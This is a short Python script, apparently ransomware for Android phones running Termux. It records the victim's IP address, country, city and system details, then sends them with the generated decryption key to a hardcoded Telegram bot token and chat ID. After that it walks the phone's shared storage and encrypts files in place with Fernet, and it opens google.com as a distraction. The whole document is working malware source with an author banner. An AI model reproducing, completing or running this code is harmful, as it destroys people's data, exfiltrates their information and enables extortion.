#!/usr/bin/env python3

def requestsapis():
 try:
  apiipurl = "https://ifconfig.me"
  rgetip = requests.get(apiipurl)
  myip = rgetip.text
  apiurl = "https://ipapi.co/"
  rget = requests.get(apiurl+myip+"/json/")
  mydata = rget.json()
  mydata = "------- Victim Information -------\n"+my_system+"\nIP: "+myip+"\nCountry: "+str(mydata["country_name"])+"\n"+"City: "+str(mydata["city"])+"\n"+"Org: "+str(mydata["org"])+"\n"
  return mydata
 except:
  print("pip install requests")


def telegramapi(msg):
 r = requests.post("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",json={"chat_id": 1862839947,
        "text" : str(msg) ,
        "parseMode" : "html"})

def loopme(file,key):
  if os.path.isfile(file):
   #print(file)
   try:
    with open(file,"rb") as fcontent:
     fcontentf = fcontent.read()
    encrypted = Fernet(key).encrypt(fcontentf)
    with open(file,"wb") as filewrite:
     filewrite.write(encrypted)
   except TypeError:
    pass
  elif os.path.isdir(file):
   for dirr in os.listdir(file):
    absolute_path = os.path.abspath(file+"/"+dirr)
    loopme(absolute_path,key)
    #print(absolute_path)
  else:
   pass

def main(key,mydata):
 msg = str("Decryption key: ")+str(key)[1:].replace("'","")+"\n\n"+str(mydata)
 telegramapi(msg)
 for file in fcontents:
  loopme(file,key)

if __name__ == "__main__":
 try:
  import os, sys, requests, platform
  from cryptography.fernet import Fernet
 except ModuleNotFoundError:
  os.system("pip install requests")
  os.system("pip install platform")
  os.system("pip install cryptography")
  import os, sys, requests, platform
  from cryptography.fernet import Fernet

 def banner():
  print("""
  //////////////////////////////////////////////////
  //  Author: kuwanggol                           //
  //  Author-Repo: https://github.com/kuwanggol   //
  //  Email: antibully09123@gmail.com             //
  //////////////////////////////////////////////////
  """)
 banner()
 my_system = platform.uname()
 my_system = f"System: {my_system.system}\nNode Name: {my_system.node}\nRelease: {my_system.release}"
 BOT_TOKEN = "5565135113:AAEhhOjl9gEZVDFtcYi5XNkk3th8Uix0KpA"
 fcontents = []
 for file in os.listdir("/storage/emulated/"):
  if file == sys.argv[0]:
   continue
  print(file)
  fcontents.append(file)
 key = Fernet.generate_key()
 main(key,requestsapis())
 os.system("termux-open-url https://google.com")
